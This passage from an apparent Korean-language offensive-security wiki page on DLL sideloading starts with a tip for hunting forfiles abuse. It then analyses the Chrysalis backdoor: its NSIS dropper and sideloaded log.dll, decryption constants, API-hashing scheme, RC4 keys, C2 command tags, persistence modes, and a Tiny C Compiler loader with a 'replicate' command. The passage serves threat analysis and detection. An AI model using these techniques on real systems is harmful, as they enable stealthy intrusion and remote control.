- **Hunting:** `/p`, `/m`, `/c`가 함께 등장할 때 `forfiles`에 대해 경보를 설정하라; 관리 스크립트 외에는 드물다.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom 침해에서는 신뢰된 업데이트 체인을 악용해 NSIS로 패킹된 dropper를 배포했고, 이는 DLL sideload와 완전 메모리 내 페이로드를 스테이지했다.

운용 흐름
- `update.exe` (NSIS)가 `%AppData%\Bluetooth`를 생성하고 **HIDDEN**으로 표시한 뒤, 이름을 바꾼 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 암호화된 블랍 `BluetoothService`를 드랍하고 EXE를 실행한다.
- 호스트 EXE는 `log.dll`을 import하고 `LogInit`/`LogWrite`를 호출한다. `LogInit`은 블랍을 mmap로 로드하고; `LogWrite`는 custom LCG 기반 스트림(상수 **0x19660D** / **0x3C6EF35F**, 키 재료는 이전 해시에서 유도)으로 복호화해 버퍼를 평문 shellcode로 덮어쓰고 임시를 해제한 뒤 점프한다.
- IAT를 피하기 위해 로더는 export 이름을 해싱하여 API를 해소한다: **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, 그 다음 Murmur 스타일의 avalanche(**0x85EBCA6B**)를 적용하고 솔티드 타겟 해시와 비교한다.

Main shellcode (Chrysalis)
- PE 유사 메인 모듈을 `gQ2JR&9;` 키로 5회에 걸쳐 add/XOR/sub을 반복하여 복호화한 뒤, 동적으로 `Kernel32.dll` → `GetProcAddress`를 로드해 import 해소를 완료한다.
- 런타임에 문자별 비트 회전/ XOR 변환으로 DLL 이름 문자열을 재구성한 뒤 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드한다.
- 두 번째 resolver는 **PEB → InMemoryOrderModuleList**를 순회하고 각 export 테이블을 4바이트 블록 단위로 Murmur 스타일 믹싱으로 파싱하며, 해시를 찾지 못하면 `GetProcAddress`로만 폴백한다.

임베디드 구성 및 C2
- 구성은 드랍된 `BluetoothService` 파일의 **offset 0x30808**(크기 **0x980**)에 위치하며 `qwhvb^435h&*7` 키로 RC4 복호화되어 C2 URL과 User-Agent를 드러낸다.
- 비콘은 점으로 구분된 호스트 프로필을 구성하고 태그 `4Q`를 앞에 붙인 뒤 `vAuig34%^325hGV` 키로 RC4 암호화해 HTTPS로 `HttpSendRequestA`를 호출한다. 응답은 RC4 복호화되어 태그 스위치로 분기한다(`4T` shell, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 언인스톨, `4` 드라이브/파일 열거 + 청크 전송 케이스).
- 실행 모드는 CLI 인수로 제어된다: 인수 없음 = 설치 영속성(service/Run 키)을 설치해 `-i`를 가리킴; `-i`는 `-k`로 자기자신을 재실행; `-k`는 설치를 건너뛰고 페이로드를 실행한다.

관찰된 대체 로더
- 동일 침해에서는 Tiny C Compiler를 드랍하고 `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했으며, 옆에 `libtcc.dll`이 있었다. 공격자가 제공한 C 소스는 shellcode를 임베드하고 컴파일해 PE 없이 메모리 내에서 실행되었다. Replicate with:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- 이 TCC 기반의 compile-and-run 단계는 런타임에 `Wininet.dll`을 로드하고 하드코딩된 URL에서 second-stage shellcode를 가져와 컴파일러 실행으로 위장하는 유연한 loader를 제공했다.

## 참고자료

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
